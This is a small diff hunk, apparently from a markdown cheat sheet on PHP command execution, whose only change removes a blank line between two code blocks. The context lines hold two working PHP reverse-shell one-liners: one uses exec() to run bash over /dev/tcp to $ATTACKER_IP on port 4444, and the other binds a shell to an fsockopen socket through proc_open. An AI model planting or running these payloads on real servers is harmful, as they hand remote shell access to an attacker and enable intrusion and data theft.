@@ -18,7 +18,6 @@ or use system() exec() passthru() shell_exec()
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/$ATTACKER_IP/4444 0>&1'");?>
 ```
 
-
 ```php
 <?php $sock=fsockopen("$ATTACKER_IP",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>
 ```
